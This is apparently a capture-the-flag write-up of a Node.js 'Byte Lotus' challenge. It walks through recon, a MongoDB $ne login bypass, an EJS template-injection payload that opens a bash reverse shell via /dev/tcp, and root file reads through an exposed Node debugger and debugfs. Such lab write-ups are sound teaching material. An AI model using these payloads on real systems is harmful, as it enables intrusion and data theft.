
**Note:** This might not be the most sophisticated or direct approach, but it’s how I tackled the challenge and figured things out along the way!
##  Challenge Briefing

Sign's on the door. Room's active. You have access you were never given, and so does he.

The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.

The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

---
## 1. Recon

I started by running an all-ports Nmap scan against the target to identify open services and running versions.

```bash 
└─$ nmap -sV -sC  10.49.157.220  -p- --min-rate 5000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 14:14 +0530
Nmap scan report for 10.49.157.220
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:f3:21:96:41:62:33:61:58:82:f2:8b:f3:ff:e3:36 (ECDSA)
|_  256 86:20:f7:a1:5f:88:18:52:18:b5:08:54:e8:f6:6d:61 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.44 seconds
```

Navigating to the web interface on port 80 brought up a login portal requesting a Staff / Guest ID and a Passphrase.

![[site.png|485]]

Next, I ran directory fuzzing using `ffuf` to discover hidden endpoints:

```bash
└─$ ffuf -u http://10.49.157.220/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.157.220/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2108, Words: 205, Lines: 39, Duration: 393ms]
logout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 34ms]
staff                   [Status: 403, Size: 1547, Words: 89, Lines: 25, Duration: 31ms]
:: Progress: [4614/4614] :: Job [1/1] :: 588 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

### Discovered Endpoints

* `/logout` (Status: 302)
* `/staff` (Status: 403 Forbidden)

Accessing `/staff` directly returned a 403 Forbidden, confirming that an authenticated session was required to view it.

---

## 2. Authentication Bypass via NoSQL Injection

Inspecting the login request in Burp Suite showed that form submissions sent parameters via standard URL-encoded form data. However, knowing the backend was running Express, I tested if the application accepted JSON body payloads.

I modified the request header to `Content-Type: application/json` and attempted a NoSQL operator injection targeting MongoDB constructs.

### Request

![[burp.png]]

By substituting the string password with the `$ne` (not equal) query operator, the database evaluated the condition to `true`, bypassing authentication and issuing a valid staff session cookie (`connect.sid`).

---

## 3. Initial Access (EJS Template Injection)

With the session cookie set, I visited the restricted `/staff` page and was greeted with the **Cabana Desk** dashboard.
  ![[staff.png|419]]
  
The page featured a text field to customize booking confirmation messages using EJS syntax (`<%= guest %>`).

Since user input was being directly evaluated by the EJS rendering engine, I tested for Server-Side Template Injection (SSTI).

### Payload (Reverse Shell)

I supplied the following payload to execute system commands via Node's `child_process`:

```ejs
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"').toString() %>

```

After setting up a Netcat listener (`nc -lvnp 4444`) and triggering the template preview, I received a reverse shell connection as the user `poolside`.

### Retrieving User Flag

![[user_1.png]]

Got the user flag !

---

## 4. Privilege Escalation via Node Inspector & debugfs

Once inside, I checked active internal listening ports to locate potential escalation vectors:

```bash
ss -ultn
```

Internal Listening Ports
```text
tcp   LISTEN   127.0.0.1:9229
```

Port `9229` indicated an active **Node.js Debugger** session running locally.

I attached to the running Node inspection session using the built-in CLI debugger:

```bash
node inspect 127.0.0.1:9229
```

Once connected, I entered the interactive REPL mode:
```text
debug> repl
```

From this REPL environment running with elevated permissions, I used `child_process` to inspect available block devices:
```javascript
process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true").toString()
```

The system had a raw NVMe partition at `/dev/nvme0n1p1`. Using `/usr/sbin/debugfs`, I directly queried the root filesystem without needing standard OS permission checks.

Listing Root Directory
```javascript
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'ls /root', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

Reading Root Flag
```javascript
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

![[root_1.png]]

 Got the root flag !

---
## Key Takeaways

1. Sanitize API Inputs: Express applications must explicitly validate that incoming request bodies adhere to expected data types (strings vs. objects) to prevent NoSQL query operator injection.
2. Secure Template Engines: Direct execution of user-controlled input in template engines like EJS creates severe SSTI vulnerabilities. User input should never be evaluated as raw code.
3. Bind Debuggers Carefully: Debug ports like Node Inspector (`9229`) grant full code execution capabilities and should never be left active or accessible without proper isolation.

